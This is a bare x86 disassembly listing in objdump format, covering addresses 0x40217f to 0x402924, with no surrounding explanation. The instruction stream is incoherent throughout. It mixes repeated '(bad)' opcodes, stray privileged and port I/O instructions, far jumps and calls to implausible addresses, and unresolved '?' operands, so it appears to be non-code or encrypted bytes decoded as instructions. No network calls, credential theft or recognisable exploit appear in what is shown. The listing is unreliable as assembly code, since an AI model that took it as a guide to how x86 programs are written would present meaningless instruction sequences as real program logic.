  40217f:	mov    bl,0x3a
  402181:	jno    0x4021db
  402183:	lea    eax,[edi]
  402185:	leave  
  402186:	and    eax,0xa1706deb
  40218b:	xor    esp,DWORD PTR [eax-0x2c]
  40218e:	pop    eax
  40218f:	xor    bl,0x19
  402192:	or     cx,bp
  402195:	loopne 0x40216e
  402197:	in     eax,0xe6
  402199:	int3   
  40219a:	ror    DWORD PTR [eax+0x70],0x30
  40219e:	out    dx,eax
  40219f:	int3   
  4021a0:	mov    bh,0xa1
  4021a2:	iret   
  4021a3:	cmp    dl,0xe0
  4021a6:	lods   al,BYTE PTR ds:[esi]
  4021a7:	push   edi
  4021a8:	push   0xe9f3adf4
  4021ad:	test   ebx,0x6c3856e4
  4021b3:	push   cs
  4021b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021b5:	test   al,0xb8
  4021b7:	sub    dh,BYTE PTR ss:[ebx]
  4021ba:	getsec 
  4021bc:	femms  
  4021be:	cmp    eax,esp
  4021c0:	xchg   ecx,eax
  4021c1:	mov    BYTE PTR [ecx],dl
  4021c3:	sub    bh,BYTE PTR [edi+0x884cf2b]
  4021c9:	dec    ebx
  4021ca:	sub    DWORD PTR [edi+0x7ef3ab55],0x1cbfebf8
  4021d4:	sbb    edx,DWORD PTR [ecx]
  4021d6:	imul   ecx,DWORD PTR [esi],0x54
  4021d9:	or     edi,ecx
  4021db:	aas    
  4021dc:	ins    BYTE PTR es:[edi],dx
  4021dd:	je     0x402204
  4021df:	mov    eax,0xcd30e965
  4021e4:	mov    bl,0x2f
  4021e6:	dec    edi
  4021e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021e8:	jb     0x402251
  4021ea:	shl    DWORD PTR [esi+0x51],cl
  4021ed:	into   
  4021ee:	aas    
  4021ef:	push   ebx
  4021f0:	and    BYTE PTR ds:0x68c2761f,cl
  4021f6:	adc    eax,0xc9bbd632
  4021fb:	retf   0x9eb0
  4021fe:	sub    dl,dl
  402200:	or     BYTE PTR [ecx],bh
  402202:	push   ecx
  402203:	jbe    0x4021f0
  402205:	inc    eax
  402206:	je     0x402250
  402208:	jg     0x402269
  40220a:	mov    al,ds:0xce810e99
  40220f:	xchg   esi,eax
  402210:	xchg   DWORD PTR [esi],edx
  402212:	jg     0x40223e
  402214:	push   esi
  402215:	jmp    0x40222e
  402217:	stos   DWORD PTR es:[edi],eax
  402218:	out    0x73,al
  40221a:	lea    ebp,[esi+0x4f816ed8]
  402220:	fsubr  DWORD PTR [edx]
  402222:	(bad)  
  402223:	retf   
  402224:	out    0x79,eax
  402226:	cmp    DWORD PTR [edx+ebx*1],edx
  402229:	aad    0x30
  40222b:	shl    BYTE PTR [edx-0x5e9fc4d1],cl
  402231:	(bad)  
  402233:	test   BYTE PTR [eax],dh
  402235:	hlt    
  402236:	and    edx,DWORD PTR [ebp+0x730a89b8]
  40223c:	adc    DWORD PTR [ebx+ebx*4],eax
  40223f:	jae    0x4022b6
  402241:	aam    0x95
  402243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402244:	lea    edx,[edx+eiz*8+0x66224978]
  40224b:	dec    ecx
  40224c:	fistp  DWORD PTR [eax]
  40224e:	push   es
  40224f:	xor    edx,ebx
  402251:	adc    bl,BYTE PTR [edi]
  402253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402254:	aad    0x7e
  402256:	inc    edi
  402257:	and    al,0x3f
  402259:	push   cs
  40225a:	pop    esi
  40225b:	ss jmp 0xf8055bd7
  402261:	ficom  WORD PTR [edi-0x73a47710]
  402267:	cmp    ebx,0x866305ec
  40226d:	mov    al,ds:0x95ab86da
  402272:	xchg   ch,bl
  402274:	sub    DWORD PTR [ebp-0x4ee372e3],edx
  40227a:	adc    dl,BYTE PTR [ebx-0x5e3a4ce6]
  402280:	imul   esp,edi,0xfffffff4
  402283:	js     0x4022ae
  402285:	xchg   esp,eax
  402286:	jge    0x4022b9
  402288:	aas    
  402289:	retf   
  40228a:	dec    eax
  40228b:	push   0x10
  40228d:	repnz (bad) 
  40228f:	dec    esi
  402290:	sbb    eax,0xb62a6519
  402295:	fwait
  402296:	js     0x402275
  402298:	jmp    0x40227c
  40229a:	push   esi
  40229b:	sti    
  40229c:	adc    al,0x1a
  40229e:	and    DWORD PTR [edx+0x21cbe414],ebx
  4022a4:	or     ecx,DWORD PTR [esi]
  4022a6:	jmp    0x11ef:0x4d0a6c46
  4022ad:	cmc    
  4022ae:	jae    0x40229c
  4022b0:	and    bh,BYTE PTR [esi-0x68]
  4022b3:	arpl   WORD PTR [ebp-0x1f],di
  4022b6:	jp     0x402306
  4022b8:	pop    esi
  4022b9:	sbb    al,BYTE PTR [ecx]
  4022bb:	cli    
  4022bc:	mov    ds:0x85bdddf,al
  4022c1:	dec    ebp
  4022c2:	(bad)  
  4022c3:	repnz test BYTE PTR [edi+0xc],al
  4022c7:	jge    0x402313
  4022c9:	dec    ebx
  4022ca:	push   ss
  4022cb:	push   esp
  4022cc:	xchg   ebx,eax
  4022cd:	test   al,0xd3
  4022cf:	adc    edi,ebx
  4022d1:	push   edi
  4022d2:	inc    esp
  4022d3:	sub    DWORD PTR [ebx+0x1a1b37a8],0x56
  4022da:	xchg   BYTE PTR [eax-0x45],ah
  4022dd:	imul   ebx,esp,0xdcb30d17
  4022e3:	add    esp,DWORD PTR [edx+0x32]
  4022e6:	add    BYTE PTR [edx+0x71823814],dl
  4022ec:	jecxz  0x402296
  4022ee:	std    
  4022ef:	mov    al,0x6a
  4022f1:	sar    ah,1
  4022f3:	mov    al,0xc3
  4022f5:	sbb    BYTE PTR ds:[ebx],dh
  4022f8:	repnz ins BYTE PTR es:[edi],dx
  4022fa:	sub    al,0xd8
  4022fc:	lods   al,BYTE PTR ds:[esi]
  4022fd:	adc    al,0x2a
  4022ff:	iret   
  402300:	mov    al,0xf3
  402302:	xor    BYTE PTR [ecx-0x5],al
  402305:	lock ret 
  402307:	pop    esp
  402308:	frstor [eax+0x1e]
  40230b:	mov    esi,0xd46674c0
  402310:	data16 fld QWORD PTR [edx-0x168352c3]
  402317:	scas   eax,DWORD PTR es:[edi]
  402318:	out    0x91,al
  40231a:	mov    esi,0x42d441c7
  40231f:	arpl   WORD PTR [ebx],ax
  402321:	inc    eax
  402322:	aas    
  402323:	loopne 0x4022db
  402325:	push   ss
  402326:	shl    DWORD PTR [eax+0x5b],1
  402329:	mov    ch,0x16
  40232b:	push   ebx
  40232c:	mov    ebx,0xfba0c263
  402331:	xor    esp,ebx
  402333:	push   0x34127a8f
  402338:	aam    0x86
  40233a:	sub    DWORD PTR [esi],0xffffffb4
  40233d:	push   ecx
  40233e:	mov    edi,0x702f9a31
  402343:	inc    eax
  402344:	cmp    al,0xeb
  402346:	sbb    ah,ah
  402348:	jp     0x40232e
  40234a:	jnp    0x402324
  40234c:	xor    bh,BYTE PTR [ecx+0x105d4ff5]
  402352:	push   ecx
  402353:	or     DWORD PTR [edi],esi
  402355:	lea    ebx,[esi]
  402357:	mov    ah,0xe7
  402359:	pop    eax
  40235a:	mov    bh,0x2a
  40235c:	data16 aas 
  40235e:	sbb    eax,0x2ba67b91
  402363:	xor    DWORD PTR [edi+0x4192ea66],ecx
  402369:	or     BYTE PTR [edx],dh
  40236b:	or     dl,BYTE PTR [eax+0x3f]
  40236e:	aaa    
  40236f:	dec    eax
  402370:	cmp    BYTE PTR [ebx+0x28],cl
  402373:	xor    DWORD PTR [eax],eax
  402375:	jno    0x40239c
  402377:	test   al,0xf
  402379:	cmp    BYTE PTR [esi-0x29f9de96],0x17
  402380:	setae  BYTE PTR [ecx+0x37be18a6]
  402387:	int3   
  402388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402389:	sti    
  40238a:	inc    esp
  40238b:	pushf  
  40238c:	adc    al,0x6a
  40238e:	imul   ebp,DWORD PTR [edi+0x31],0xa07c8ccb
  402395:	xor    bh,BYTE PTR [eax+0x2c]
  402398:	ins    BYTE PTR es:[edi],dx
  402399:	es and ah,ah
  40239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40239d:	and    esi,edi
  40239f:	mov    ebp,0x4b241c88
  4023a4:	xor    al,0x4e
  4023a6:	mov    al,0xe6
  4023a8:	mov    ebx,0xc1fba7a0
  4023ad:	fs in  eax,dx
  4023af:	sub    BYTE PTR [ecx+0x6501db97],dh
  4023b5:	or     al,0x2
  4023b7:	imul   ecx,ebx,0x3
  4023ba:	pop    ecx
  4023bb:	jno    0x402346
  4023bd:	int3   
  4023be:	int3   
  4023bf:	or     al,0x54
  4023c1:	dec    eax
  4023c2:	add    cl,BYTE PTR [ebx]
  4023c4:	das    
  4023c5:	fcomp  QWORD PTR [esi+0x38]
  4023c8:	mov    al,0xa0
  4023ca:	out    dx,al
  4023cb:	fwait
  4023cc:	ins    BYTE PTR es:[edi],dx
  4023cd:	dec    edx
  4023ce:	xchg   DWORD PTR [ecx],edx
  4023d0:	dec    edx
  4023d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d2:	mov    ah,0x9d
  4023d4:	leave  
  4023d5:	adc    eax,0x4472de9d
  4023da:	in     al,dx
  4023db:	push   es
  4023dc:	std    
  4023dd:	imul   eax,ebp,0x45484f5d
  4023e3:	push   0xa300cb02
  4023e8:	xchg   esi,eax
  4023e9:	push   0x84eba57c
  4023ee:	add    ah,BYTE PTR [ebp+0x1f4bc7b6]
  4023f4:	xor    esp,DWORD PTR ds:0x598c785e
  4023fa:	fimul  DWORD PTR [edx+0x46]
  4023fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023fe:	adc    eax,0xc5f959dc
  402403:	inc    esp
  402404:	or     edi,0x9a2efdd8
  40240a:	into   
  40240b:	cmp    al,0xe0
  40240d:	jmp    0x1278740b
  402412:	pop    ebp
  402413:	inc    eax
  402414:	cmp    al,0x3f
  402416:	cmc    
  402417:	mov    bh,0xd8
  402419:	pop    esi
  40241a:	push   ss
  40241b:	out    0xbc,eax
  40241d:	(bad)  
  40241e:	popa   
  40241f:	jl     0x40240d
  402421:	or     DWORD PTR [edi-0x204366e4],ebx
  402427:	pop    ecx
  402428:	hlt    
  402429:	jae    0x4023ce
  40242b:	or     al,0x9f
  40242d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40242e:	sahf   
  40242f:	xlat   BYTE PTR ds:[ebx]
  402430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402431:	mov    ds:0xd8b7a2a6,al
  402436:	cmp    ch,BYTE PTR [ebp+0x21]
  402439:	dec    esp
  40243a:	in     eax,0x32
  40243c:	in     al,0xd2
  40243e:	packsswb mm4,QWORD PTR [edi]
  402441:	add    BYTE PTR [ebx+0x190bd5b7],al
  402447:	push   ebx
  402448:	sub    al,0x6a
  40244a:	jge    0x402407
  40244c:	ins    BYTE PTR es:[edi],dx
  40244d:	jge    0x402417
  40244f:	jl     0x40246f
  402451:	lods   eax,DWORD PTR ds:[esi]
  402452:	mov    eax,fs
  402454:	push   es
  402455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402456:	repz xchg esi,eax
  402458:	lahf   
  402459:	dec    eax
  40245a:	mov    dl,0xb8
  40245c:	test   al,0x21
  40245e:	or     ch,bh
  402460:	imul   ecx,DWORD PTR [ebp+0x21],0xffffff83
  402464:	sar    esp,0x11
  402467:	dec    ecx
  402468:	call   0x71128563
  40246d:	pop    esp
  40246e:	jb     0x4024d9
  402470:	and    ebp,ecx
  402472:	jbe    0x402443
  402474:	mov    bl,0xab
  402476:	and    ecx,0xfffffff8
  402479:	gs add ch,cl
  40247c:	inc    esi
  40247d:	dec    ebx
  40247e:	es in  eax,0x95
  402481:	out    dx,eax
  402482:	int    0x75
  402484:	arpl   WORD PTR [edi+0x59],bx
  402487:	xor    BYTE PTR [esi+ebx*8],cl
  40248a:	mov    ?,eax
  40248c:	mov    ?,edi
  40248e:	pusha  
  40248f:	mov    cl,0xb
  402491:	pop    ecx
  402492:	sti    
  402493:	shufps xmm6,XMMWORD PTR [ecx],0xd0
  402497:	pushf  
  402498:	add    eax,DWORD PTR [esi-0x17]
  40249b:	in     al,0x16
  40249d:	sbb    ch,BYTE PTR [edx+edi*4]
  4024a0:	mov    WORD PTR ds:0x155c3cb0,?
  4024a6:	push   ecx
  4024a7:	add    al,0xe5
  4024a9:	scas   eax,DWORD PTR es:[edi]
  4024aa:	push   ss
  4024ab:	xor    al,0x3f
  4024ad:	sub    edi,DWORD PTR [edx-0x40]
  4024b0:	outs   dx,DWORD PTR ds:[esi]
  4024b1:	mov    bl,0x47
  4024b3:	and    cl,BYTE PTR [ebx+0x64b942b9]
  4024b9:	popf   
  4024ba:	mov    fs,WORD PTR ds:0xfd70da67
  4024c0:	mov    edx,0x8628af87
  4024c5:	mov    eax,ds:0xc5b9b678
  4024ca:	out    0x1e,eax
  4024cc:	push   edi
  4024cd:	arpl   WORD PTR [eax],cx
  4024cf:	inc    ebp
  4024d0:	push   0xd2d06ff2
  4024d5:	mov    eax,DWORD PTR [ebx-0x6d464b6b]
  4024db:	cwde   
  4024dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024dd:	xor    al,0xb2
  4024df:	std    
  4024e0:	add    ebp,esi
  4024e2:	inc    ebp
  4024e3:	cmp    BYTE PTR [esi],0xce
  4024e6:	mov    edx,0xb8de8956
  4024eb:	test   DWORD PTR [ecx+eax*8],edx
  4024ee:	sub    BYTE PTR [ecx],0x3c
  4024f1:	xchg   ebx,eax
  4024f2:	adc    eax,0x48d3e7b8
  4024f7:	outs   dx,DWORD PTR ds:[esi]
  4024f8:	shl    BYTE PTR [esi+0x15],cl
  4024fb:	addr16 cs adc si,bx
  402500:	call   0xefec968e
  402505:	cmp    eax,0xf40867fe
  40250a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40250b:	pop    esp
  40250c:	in     eax,dx
  40250d:	jmp    0x403b:0x9c8db2bb
  402514:	adc    DWORD PTR [eax-0x78],0xb82981e3
  40251b:	pop    ecx
  40251c:	cmp    ah,ch
  40251e:	stos   BYTE PTR es:[edi],al
  40251f:	and    al,0x21
  402521:	stc    
  402522:	jge    0x40253c
  402524:	mov    bl,0xb1
  402526:	js     0x40250b
  402528:	or     esp,DWORD PTR [edi+0x7939ae63]
  40252e:	cmp    eax,0x648eea91
  402533:	lods   eax,DWORD PTR ds:[esi]
  402534:	mov    es,eax
  402536:	int    0x24
  402538:	and    al,0x20
  40253a:	cs fwait
  40253c:	mul    BYTE PTR [ebp+0x5fbbee]
  402542:	and    BYTE PTR [ecx-0x61ee1a24],bl
  402548:	outs   dx,BYTE PTR ds:[esi]
  402549:	cmp    BYTE PTR [ebx],dl
  40254b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40254c:	aaa    
  40254d:	out    dx,al
  40254e:	adc    eax,0xec70509b
  402553:	add    DWORD PTR [eax+edi*4],esi
  402556:	outs   dx,BYTE PTR ds:[esi]
  402557:	xor    al,bh
  402559:	fisttp DWORD PTR [eax+0x2c246ace]
  40255f:	arpl   WORD PTR [eax-0x53],sp
  402562:	stc    
  402563:	mov    DWORD PTR [ecx-0x69],ebx
  402566:	sub    eax,0xdbfa49f5
  40256b:	nop
  40256c:	pop    edi
  40256d:	pop    edx
  40256e:	xchg   ecx,eax
  40256f:	add    eax,edi
  402571:	mov    cl,BYTE PTR [ebx]
  402573:	dec    edi
  402574:	aaa    
  402575:	ficomp WORD PTR cs:[esi+0x78]
  402579:	iret   
  40257a:	mov    ds:0xf1b09d0f,eax
  40257f:	adc    DWORD PTR [edi-0x43],0x81e2a64e
  402586:	jmp    0x4025cd
  402588:	(bad)  
  402589:	xchg   edx,eax
  40258a:	add    BYTE PTR [ecx+0x4931f9e6],dh
  402590:	imul   esp,ecx,0xb9310c6c
  402596:	inc    esp
  402597:	leave  
  402598:	loopne 0x4025db
  40259a:	adc    al,0xc5
  40259c:	cmp    ch,BYTE PTR [esi-0x1d903a97]
  4025a2:	lods   al,BYTE PTR ds:[esi]
  4025a3:	les    eax,FWORD PTR [esi]
  4025a5:	jae    0x402528
  4025a7:	pop    ss
  4025a8:	jmp    0x7180:0x9abbe8ab
  4025af:	retf   
  4025b0:	pop    edx
  4025b1:	lahf   
  4025b2:	inc    eax
  4025b3:	sub    eax,0x384fa175
  4025b8:	cdq    
  4025b9:	and    al,0x90
  4025bb:	xor    al,0x52
  4025bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025be:	jne    0x402557
  4025c0:	jno    0x402585
  4025c2:	push   eax
  4025c3:	mov    cl,BYTE PTR [edi+0x69b2923f]
  4025c9:	in     eax,dx
  4025ca:	(bad)  
  4025cb:	mov    ebp,0x29c97c32
  4025d0:	das    
  4025d1:	stos   BYTE PTR es:[edi],al
  4025d2:	cmp    edi,esi
  4025d4:	sbb    eax,0xeba5be6c
  4025d9:	push   ss
  4025da:	and    al,BYTE PTR [ebx]
  4025dc:	dec    edx
  4025dd:	push   0xffffff81
  4025df:	push   edx
  4025e0:	and    al,0x28
  4025e2:	jmp    0x40261a
  4025e4:	pop    ebp
  4025e5:	dec    esp
  4025e6:	sbb    BYTE PTR [eax],cl
  4025e8:	test   eax,0xccbf43d6
  4025ed:	(bad)  
  4025ee:	xchg   edx,eax
  4025ef:	mov    al,0x17
  4025f1:	repz pusha 
  4025f3:	ss or  eax,0x7e7302a7
  4025f9:	rcr    WORD PTR [eax-0x6cf14b4a],0x28
  402601:	or     cl,0xc1
  402604:	lods   al,BYTE PTR ds:[esi]
  402605:	ins    BYTE PTR es:[edi],dx
  402606:	iret   
  402607:	xor    DWORD PTR ds:0x7056017b,edx
  40260d:	data16 je 0x402665
  402610:	lods   eax,DWORD PTR ds:[esi]
  402611:	xchg   ebx,eax
  402612:	inc    ebx
  402613:	stc    
  402614:	sbb    eax,0x50
  402617:	das    
  402618:	jno    0x40266b
  40261a:	aas    
  40261b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40261c:	out    dx,al
  40261d:	mov    ch,0x2b
  40261f:	rcl    dh,cl
  402621:	or     eax,0xf5b8c342
  402626:	(bad)  
  402627:	scas   al,BYTE PTR es:[edi]
  402628:	add    BYTE PTR [edx-0x72],cl
  40262b:	imul   esp,ecx,0x66
  40262e:	gs dec edi
  402630:	push   esi
  402631:	lds    esi,FWORD PTR [eax]
  402633:	mov    ch,0x26
  402635:	jnp    0x402641
  402637:	lea    edx,[ebx]
  402639:	sahf   
  40263a:	push   cs
  40263b:	cmp    BYTE PTR [eax+0x26],bh
  40263e:	mul    ebp
  402640:	inc    ecx
  402641:	pop    es
  402642:	pop    esp
  402643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402644:	ins    DWORD PTR es:[edi],dx
  402645:	daa    
  402646:	test   eax,0x18b4bd65
  40264b:	jg     0x4025e8
  40264d:	retf   0x7393
  402650:	xor    BYTE PTR [ecx+edi*8-0x5955e105],0x5d
  402658:	mov    esi,DWORD PTR [ecx-0x20]
  40265b:	out    0xf8,eax
  40265d:	in     eax,0x57
  40265f:	push   edx
  402660:	mov    edx,0x782402b5
  402665:	pop    edi
  402666:	rol    DWORD PTR [ebx+0x0],0x42
  40266a:	gs inc edx
  40266c:	mov    ds:0xd30ff07,eax
  402671:	popa   
  402672:	push   ebp
  402673:	aad    0x75
  402675:	sbb    BYTE PTR ds:0xbdb02de1,ah
  40267b:	cmp    BYTE PTR [ebx],0xf6
  40267e:	loopne 0x40262b
  402680:	lds    eax,FWORD PTR [eax-0x6647d4cb]
  402686:	cmp    BYTE PTR [esi],ch
  402688:	popa   
  402689:	adc    DWORD PTR [ebx-0x56],edi
  40268c:	ficom  DWORD PTR [edi+esi*8]
  40268f:	xchg   ebx,eax
  402690:	pop    ds
  402691:	pop    ebx
  402692:	bound  ecx,QWORD PTR [ebp+0x31]
  402695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402696:	shr    DWORD PTR [esi-0x320a3def],0x41
  40269d:	adc    esp,0xba7a21d2
  4026a3:	xchg   ecx,eax
  4026a4:	dec    ebp
  4026a5:	mov    esi,0x11a29645
  4026aa:	mov    esp,DWORD PTR [ebx]
  4026ac:	or     esi,DWORD PTR [edi+edi*1-0x12]
  4026b0:	mov    dh,bl
  4026b2:	pop    ecx
  4026b3:	inc    ebx
  4026b4:	idiv   esp
  4026b6:	and    DWORD PTR [ecx-0x2ca832be],0xffffffd3
  4026bd:	scas   al,BYTE PTR es:[edi]
  4026be:	fcom   DWORD PTR [eax+edx*2-0x33d7f06d]
  4026c5:	pop    ebx
  4026c6:	fcom   QWORD PTR [ecx-0x6bbb0bb7]
  4026cc:	test   al,0x15
  4026ce:	clc    
  4026cf:	fld    TBYTE PTR [edx]
  4026d1:	xor    ecx,DWORD PTR [ebp+0x421a4ce0]
  4026d7:	xor    DWORD PTR ds:0xfa54505,0x20fb033e
  4026e1:	aad    0xc4
  4026e3:	enter  0x57ee,0x30
  4026e7:	rol    BYTE PTR [edx],1
  4026e9:	add    edx,DWORD PTR [edi]
  4026eb:	push   edi
  4026ec:	gs inc ebx
  4026ee:	addr16 mov ebp,0xba41d872
  4026f4:	mul    esp
  4026f6:	and    ah,0xbf
  4026f9:	mov    esi,0xf85f9bce
  4026fe:	sar    BYTE PTR [esp+ebp*8-0x5cb9b92e],0xe8
  402706:	loopne 0x402705
  402708:	jbe    0x4026ea
  40270a:	bound  ecx,QWORD PTR [esi]
  40270c:	fs stos DWORD PTR es:[edi],eax
  40270e:	sub    al,0x80
  402710:	out    dx,al
  402711:	mov    esp,DWORD PTR ds:0x11fcb2a9
  402717:	repz mov al,0xd9
  40271a:	and    BYTE PTR [edx],0xfd
  40271d:	ret    
  40271e:	arpl   WORD PTR [ebx+0x16b90571],si
  402724:	sub    dh,BYTE PTR [ecx]
  402726:	mov    ah,0xe0
  402728:	mov    al,0xa1
  40272a:	and    BYTE PTR ss:[ebx],0x27
  40272e:	xor    ebp,ebx
  402730:	pop    edi
  402731:	sub    ah,bh
  402733:	add    eax,0xeb221c56
  402738:	sub    DWORD PTR [edx],esi
  40273a:	cmp    BYTE PTR [eax],al
  40273c:	int    0x8e
  40273e:	imul   esp,DWORD PTR [eax-0x1f],0x20f08674
  402745:	sbb    DWORD PTR [ebx+ebx*4-0x58],edx
  402749:	mov    ebp,0x5b1c5d49
  40274e:	xchg   esp,eax
  40274f:	(bad)  
  402750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402751:	leave  
  402752:	mov    ebx,0xe67afbbb
  402757:	stos   DWORD PTR es:[edi],eax
  402758:	jae    0x4026f3
  40275a:	stos   DWORD PTR es:[edi],eax
  40275b:	push   edi
  40275c:	jae    0x40273c
  40275e:	push   0x4f
  402760:	and    DWORD PTR [eax-0x1e],eax
  402763:	xchg   ebp,eax
  402764:	jp     0x4027d2
  402766:	fbld   TBYTE PTR [eax]
  402768:	stos   BYTE PTR es:[edi],al
  402769:	lds    esi,FWORD PTR [edi-0x394fc476]
  40276f:	mov    ah,0xd7
  402771:	push   cs
  402772:	daa    
  402773:	popa   
  402774:	(bad)  
  402775:	stos   BYTE PTR es:[edi],al
  402776:	add    BYTE PTR [ebx-0x4e62664a],al
  40277c:	arpl   bp,dx
  40277e:	mov    edi,ebx
  402780:	mov    bh,0x6f
  402782:	add    al,0x44
  402784:	rcr    DWORD PTR [ebx],1
  402786:	cmp    ah,BYTE PTR [eax]
  402788:	jge    0x40271a
  40278a:	xlat   BYTE PTR ds:[ebx]
  40278b:	cli    
  40278c:	pop    ds
  40278d:	fsubr  DWORD PTR [esi]
  40278f:	rcr    BYTE PTR [ecx],cl
  402791:	mov    bh,0xab
  402793:	adc    DWORD PTR [edi+0x220456de],edi
  402799:	lock data16 inc BYTE PTR [esi]
  40279d:	pop    edx
  40279e:	cmp    eax,0xe18c4015
  4027a3:	retf   0x1f8f
  4027a6:	inc    ecx
  4027a7:	dec    edi
  4027a8:	push   ds
  4027a9:	jmp    FWORD PTR [esi+ebp*2+0x21]
  4027ad:	cli    
  4027ae:	lahf   
  4027af:	jnp    0x402802
  4027b1:	aaa    
  4027b2:	xor    DWORD PTR [ecx-0x6831eb4d],0xffffffc3
  4027b9:	test   eax,0x778971bb
  4027be:	mov    eax,ds:0x2b1bd894
  4027c3:	mov    edi,0x979588a5
  4027c8:	je     0x4027d7
  4027ca:	je     0x402794
  4027cc:	and    esi,edi
  4027ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027cf:	pop    es
  4027d0:	daa    
  4027d1:	cmp    esp,DWORD PTR [esi+ebx*4-0x5d]
  4027d5:	pop    ecx
  4027d6:	dec    esi
  4027d7:	loop   0x402767
  4027d9:	push   ebx
  4027da:	shl    BYTE PTR [edi-0xa],0x6
  4027de:	mov    ch,0xa6
  4027e0:	add    ebx,ebx
  4027e2:	popf   
  4027e3:	or     al,0x7f
  4027e5:	adc    eax,DWORD PTR [eax-0x19]
  4027e8:	into   
  4027e9:	adc    eax,DWORD PTR [ebx]
  4027eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ec:	outs   dx,DWORD PTR ds:[esi]
  4027ed:	mov    esp,0x1d818acb
  4027f2:	cmc    
  4027f3:	mov    ebp,0xe8c031bb
  4027f8:	cdq    
  4027f9:	int3   
  4027fa:	mov    esp,0x77770e5a
  4027ff:	ficom  DWORD PTR [edi]
  402801:	inc    ebp
  402802:	sbb    esp,DWORD PTR [ecx]
  402804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402805:	dec    ebp
  402806:	dec    esp
  402807:	and    al,0xce
  402809:	cmp    ch,BYTE PTR [edi+0x73]
  40280c:	sbb    dl,dl
  40280e:	jg     0x4027d3
  402810:	push   ebp
  402811:	inc    edi
  402812:	jno    0x40286a
  402814:	cmp    DWORD PTR [eax-0x8],esp
  402817:	adc    eax,0x895aa173
  40281c:	in     eax,0x9f
  40281e:	out    dx,al
  40281f:	and    BYTE PTR [eax-0xd],ah
  402822:	pop    ss
  402823:	cmp    eax,0x93aba523
  402828:	cmp    BYTE PTR [ebx+0x649e16ab],al
  40282e:	mov    eax,0x6bca3e1a
  402833:	call   0x76f1c1e4
  402838:	cmp    ecx,esp
  40283a:	pop    edx
  40283b:	loopne 0x4028a4
  40283d:	xchg   ebp,eax
  40283e:	cmp    BYTE PTR [edx+0x4b],al
  402841:	and    bh,ch
  402843:	sbb    al,bl
  402845:	and    eax,0x19338091
  40284a:	out    dx,al
  40284b:	imul   ebp,ecx,0x40
  40284e:	lods   al,BYTE PTR ds:[esi]
  40284f:	add    BYTE PTR [ecx+0x25],0xc6
  402853:	stc    
  402854:	ret    
  402855:	sub    DWORD PTR [edx-0x29e9a98b],ebp
  40285b:	mov    al,BYTE PTR [eax-0x36]
  40285e:	mov    esp,DWORD PTR [eax]
  402860:	xor    al,0x98
  402862:	shr    cl,1
  402864:	repnz aas 
  402866:	mov    ds:0xb3f3ef35,al
  40286b:	nop
  40286c:	shl    BYTE PTR [edi+edx*2],0x32
  402870:	test   eax,0xe0fd826d
  402875:	ins    BYTE PTR es:[edi],dx
  402876:	cmp    DWORD PTR [ecx+0x78118cdc],esi
  40287c:	icebp  
  40287d:	mov    dl,0x62
  40287f:	push   ebx
  402880:	sub    cl,0xc0
  402883:	call   0x4ed56ee1
  402888:	pop    ebp
  402889:	sbb    al,0x77
  40288b:	ret    
  40288c:	ins    BYTE PTR es:[edi],dx
  40288d:	mov    ebx,0x4d198831
  402892:	fsubr  QWORD PTR [edx+0x59]
  402895:	xchg   ecx,eax
  402896:	ror    DWORD PTR [ecx+0x3eff4882],1
  40289c:	in     eax,dx
  40289d:	imul   DWORD PTR [ecx]
  40289f:	leave  
  4028a0:	add    ebp,DWORD PTR [ebp-0x6]
  4028a3:	pushf  
  4028a4:	(bad)
  4028a7:	sbb    al,0x42
  4028a9:	jmp    0x559f:0x3d7b650e
  4028b0:	fcmovne st,st(5)
  4028b2:	jb     0x402881
  4028b4:	stos   DWORD PTR es:[edi],eax
  4028b5:	mov    edx,0x3fa6dd20
  4028ba:	loope  0x402912
  4028bc:	mov    eax,0x447df0f6
  4028c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c2:	fild   DWORD PTR [ebp+0x3a1cac07]
  4028c8:	mov    ecx,0xd768330
  4028cd:	js     0x40293c
  4028cf:	sub    cl,dl
  4028d1:	adc    DWORD PTR [esp],esp
  4028d4:	aas    
  4028d5:	fisubr WORD PTR [edi]
  4028d7:	cmp    DWORD PTR [eax],0x8cc4310d
  4028dd:	cmp    esi,DWORD PTR [ecx-0x27]
  4028e0:	xchg   ecx,eax
  4028e1:	adc    al,0xaf
  4028e3:	mov    dh,BYTE PTR [edi-0x79125ad8]
  4028e9:	sub    BYTE PTR [ecx-0x762181af],dh
  4028ef:	test   BYTE PTR [eax+0x137ac951],bl
  4028f5:	pop    edx
  4028f6:	(bad)  
  4028f7:	cdq    
  4028f8:	retf   0xbd11
  4028fb:	int3   
  4028fc:	ror    BYTE PTR [esi-0x40],cl
  4028ff:	fs dec edi
  402901:	cs aas 
  402903:	cwde   
  402904:	out    dx,al
  402905:	rcr    DWORD PTR [ecx],1
  402907:	fsub   QWORD PTR [edx-0x65196be1]
  40290d:	icebp  
  40290e:	in     al,dx
  40290f:	jecxz  0x402943
  402911:	or     BYTE PTR [esi+ebp*8+0x54],bl
  402915:	mov    ds:0x8a0567ea,al
  40291a:	xchg   edi,eax
  40291b:	sub    DWORD PTR [edi+edi*1+0x70ae0570],ecx
  402922:	out    0x1f,al
  402924:	cmp    BYTE PTR ds:0x9b76a51d,al
